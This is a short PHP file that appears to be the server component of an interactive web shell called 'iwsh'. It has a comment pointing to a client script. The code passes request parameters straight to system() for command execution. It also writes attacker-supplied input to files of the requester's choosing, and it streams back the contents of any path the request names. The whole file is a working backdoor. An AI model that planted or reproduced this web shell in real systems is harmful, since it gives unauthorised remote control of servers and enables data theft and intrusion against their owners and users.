<?php
/*
*   Created by NumquamScire for iwsh project.
*   Access to full interactive web shell use client iwsh.sh -u http://localhost/PATH_TO_FILE/iwsh.php -d
*/

if (isset($_REQUEST['o']) || isset($_REQUEST['i']) || isset($_REQUEST['c']) || isset($_REQUEST['fi'])) {
    if(isset($_REQUEST['i'])){
        if(isset($_REQUEST['fi'])) {
            $fi = $_REQUEST['fi'];
        } else {
            $fi = "/tmp/i";
        }
        $command = $_REQUEST['i'];
        file_put_contents($fi, $command , FILE_APPEND);
    }

    if(isset($_REQUEST['c'])){
        $command = $_REQUEST['c'];
        system($_REQUEST['c']);
    }

    if (isset($_REQUEST['o'])) {
        ob_end_flush();
        // Remove headers
        header_remove();
        // Removes the HTTP status line
        header_remove('Status'); 
        header_remove('Date');
        header_remove('Connection');
        header_remove('Content-Type');

        // Function to send a chunk of data
        function sendChunk($data) {
            echo $data; #. "\n";
            flush();
        }
        $pipe = fopen($_REQUEST['o'], 'r');
        
        while (true) {
            $chunk = fread($pipe, 1);
            if ($chunk != "" ) {
                sendChunk($chunk);
            }
            usleep(100);
        }
        ob_end_flush();
    }

    exit;
}

?>



